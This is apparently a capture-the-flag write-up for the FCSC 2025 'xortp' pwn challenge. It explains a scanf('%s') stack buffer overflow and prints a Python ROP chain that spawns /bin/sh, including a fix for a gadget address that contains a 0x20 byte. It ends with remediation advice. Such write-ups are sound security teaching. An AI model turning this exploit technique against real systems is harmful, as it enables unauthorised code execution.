# XORTP

**Link:** [https://hackropole.fr/fr/challenges/pwn/fcsc2025-pwn-xortp/](https://hackropole.fr/fr/challenges/pwn/fcsc2025-pwn-xortp/)

**Category:** ![](https://img.shields.io/badge/pwn-3776AB)

**Difficulty:** ⭐

**Description:** The challenge provides two files:

- `xortp`: a 64-bit Linux binary
- `xortp.c`: the corresponding C source code

The binary runs on a remote server `nc chall.fcsc.fr 2105`. It asks for a filename and encrypts it.

**Goal:** Exploit a vulnerable binary using a stack buffer overflow to read the flag.

# TL;DR

- The binary reads a filename with `scanf("%s")` leading to a **stack buffer overflow**.
- The stack is **non-executable (NX)**, so we use a **ROP chain** to spawn a shell.
- We must avoid **space bytes** (`0x20`) in gadget addresses.
- The full exploit is available in the file `solution.py`.

# Solution

### **Program Behavior**

Let’s first analyze the `main` function of the provided C code:

```c
int
main()
{
    char filename[BUF_SIZE]; // Vulnerable buffer
    unsigned char m[BUF_SIZE];
    unsigned char k[BUF_SIZE];

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    system("ls -ld *");

    printf("Which file would like to encrypt?\n");
    scanf("%s", filename); // Buffer overflow here

    // ... (file processing)
}
```

The logic of the main function is simple: it lists the current files, asks for a filename to encrypt, reads the file, encrypts it using XOR with OTP, and prints the result.

![image](https://github.com/user-attachments/assets/0d2ad45a-0824-4272-a78b-df351c6e7ce0)

The function `scanf("%s", filename)` is vulnerable to **stack buffer overflow** because `filename` is a fixed-size buffer and no size checking is performed.

### Binary Protections

Running `checksec` shows:

![image 1](https://github.com/user-attachments/assets/41751993-1d51-474c-ac7e-0ce338125b3e)

This means:

- **NX is enabled**, so the stack is non-executable and shellcode injection is not possible.
- The binary is **not PIE**, so addresses are fixed.
- A **stack canary is present**, but by analyzing the disassembly code, we find that the canary is not checked in the `main()` function.

Therefore, a ROP chain is possible.

### **Finding the offset**

To find the offset needed to overwrite the return address, we used `cyclic` patterns of increasing size until we got a segmentation fault at offset 152. We deduce that the offset is 152 because the bytes following that value overwrote the instruction pointer:

![image 2](https://github.com/user-attachments/assets/fdfe9408-341d-407f-b9a4-98fd19b1914f)

### Building the ROP Chain

Since NX is enabled, we cannot inject shellcode directly. Instead, we craft a **ROP chain** to call `execve("/bin/sh", NULL, NULL)`.

We generate gadgets using `ROPgadget --binary xortp --ropchain`. The ROP chain is appended after 152 bytes of padding and saved into a file named `payload`.

![image 3](https://github.com/user-attachments/assets/70df7310-41b8-4436-b16c-bccb08fa0cbd)


Unfortunately, the payload failed. To diagnose the issue, we used `gdb` and set a breakpoint at the `ret` instruction in the `main` function. We then examined the stack:

![pwn](https://github.com/user-attachments/assets/b5be691d-c227-48e3-9d35-91c0552d6b39)


Surprise! Only 7 gadgets from our ROP chain were written to the stack. It turns out that one gadget (`xor rax, rax ; ret`) had the address `0x0000000000434a20`, which includes a **space byte** (`0x20`).

```c
from struct import pack

p = b'A'*152

p += pack('<Q', 0x000000000040f972) # pop rsi ; ret
p += pack('<Q', 0x00000000004c40e0) # @ .data
p += pack('<Q', 0x00000000004424f7) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x0000000000445371) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040f972) # pop rsi ; ret
p += pack('<Q', 0x00000000004c40e8) # @ .data + 8
p += pack('<Q', 0x0000000000434a20) # xor rax, rax ; ret                <---- presence of the 0x20 byte
p += pack('<Q', 0x0000000000445371) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401f60) # pop rdi ; ret
p += pack('<Q', 0x00000000004c40e0) # @ .data
p += pack('<Q', 0x000000000040f972) # pop rsi ; ret
p += pack('<Q', 0x00000000004c40e8) # @ .data + 8
p += pack('<Q', 0x00000000004867a7) # pop rdx ; pop rbx ; ret
p += pack('<Q', 0x00000000004c40e8) # @ .data + 8
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x0000000000434a20) # xor rax, rax ; ret                <---- presence of the 0x20 byte
```

Since `scanf("%s")` stops reading at **space**, **\n**, or **\t**, everything after that was ignored. This gadget is used twice. We confirmed the issue by printing the content of the payload.

![image 4](https://github.com/user-attachments/assets/e5b2ca03-6ec2-4f93-941b-a095b501be61)

We then searched for an equivalent gadget with the same functionality but no space byte.

![image 5](https://github.com/user-attachments/assets/9210d66e-530b-478d-a722-03a8e3daeb9f)

Luckily, we found an equivalent gadget: `nop ; xor rax, rax ; ret`, which doesn’t contain any whitespace bytes.

After updating our ROP chain with this gadget, the payload was injected successfully.

### Getting the flag

With the working payload, we spawned a local shell. We then modified the script to interact with the remote server and successfully retrieved the flag.

![image 6](https://github.com/user-attachments/assets/41d1cd68-8e06-4c6f-b14b-e049b4118150)

# Remediation

- Use safe functions such as `fgets()` to limit the number of characters read.
- Compile binaries with the `-fstack-protector-all` flag to enforce the use of stack canaries in all functions.
